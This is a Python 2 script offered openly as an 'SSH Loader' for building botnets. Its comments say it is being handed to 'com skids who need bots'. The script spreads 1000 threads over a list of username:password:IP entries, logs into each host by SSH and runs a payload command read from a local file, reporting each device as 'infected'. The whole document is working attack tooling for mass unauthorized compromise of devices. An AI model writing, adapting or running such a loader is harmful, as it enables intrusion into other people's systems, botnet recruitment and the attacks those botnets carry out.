#Feel free to use the SSH Loader, uses multi threads to read lines and load all at once.
#Some of the code was re-written by me [Riyzz] for better preformance and read from a different file for better optimization.
#And not some next ass shitty slow SSH Loader.

#This was kept private for at least 2 years lol but now i will just be handing it out to the com skids who need bots.

import sys, re, os, paramiko, socket, json
from threading import Thread
from time import sleep
 
if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")
 
paramiko.util.log_to_file("/dev/null")
with open("payload.txt", "r") as payload:
    rekdevice=payload.readline()
print "\033[31m"

print "SSH Loader re-written by Riyzz"
 
threads = int(1000)
 
lines = open(sys.argv[1],"r").readlines()
 
fh = open("sshopen.txt","a+")
 
def chunkify(lst,n):
    return [ lst[i::n] for i in xrange(n) ]
 
running = 0
 
loaded = 0
 
def printStatus():
    while 1:
        sleep(10)
        print "\033[1;31mTotal \033[1;33mMMXR \033[1;31mLoaded: " + str(loaded) + "\033[37m"
        if loaded >= 1000:
            print "\033[1;31mBig Bots has been loaded"
 
def haxit(username,password,ip):
    try:
        port = 22
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port = port, username=username, password=password, timeout=3)
        ssh.exec_command(rekdevice)
        print "\033[1;31mA SSH device has been \033[1;33m[infected] \033[1;31mand sent to the payload: \033[1;33m" + ip + "\033[1;33m"
        sleep(10)
        loaded += 1
        ssh.close()
    except:
        pass
 
def check(chunk, fh):
    global running
    running += 1
    threadID = running
    for login in chunk:
        login = login.replace("DUP ", "")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((login.split(":")[2], 22))
            s.close()
            print "\033[1;31m>>" + login + " \033[1;31mSSH device still needs to be infected \033[1;33m[LOADING NOW]"
            haxit(login.split(":")[0], login.split(":")[1], login.split(":")[2])
            fh.write(login + "\r\n")
            fh.flush()
        except:
            pass
    print "\033[1;31mThis \033[1;33mThread " + str(threadID) + " \033[1;31mhas \033[1;33msuccesfully finished \033[1;31mloading " + str(len(chunk)) + " \033[1;31mIP Loaded: \033[1;33m" + str(loaded)
    running -= 1
 
lines = map(lambda s: s.strip(), lines)
 
chunks = chunkify(lines, threads)
 
print "\033[1;32mAll threads are ready to scan and load to your payload"
 
Thread(target = printStatus, args = ()).start()
 
for thread in xrange(0,threads):
    if thread >= 384:
        sleep(0.2)
    try:
        Thread(target = check, args = (chunks[thread], fh,)).start()
    except:
        pass
print "\033[1;31mAll devices that was \033[1;33minfected \033[1;31mhas been completed. \033[1;33mPress Enter 3 \033[1;31mtimes to quit out"
 
for i in range(0,3):
    raw_input()
 
fh.close()
 
os.popen("kill -9 " + str(os.getpid()))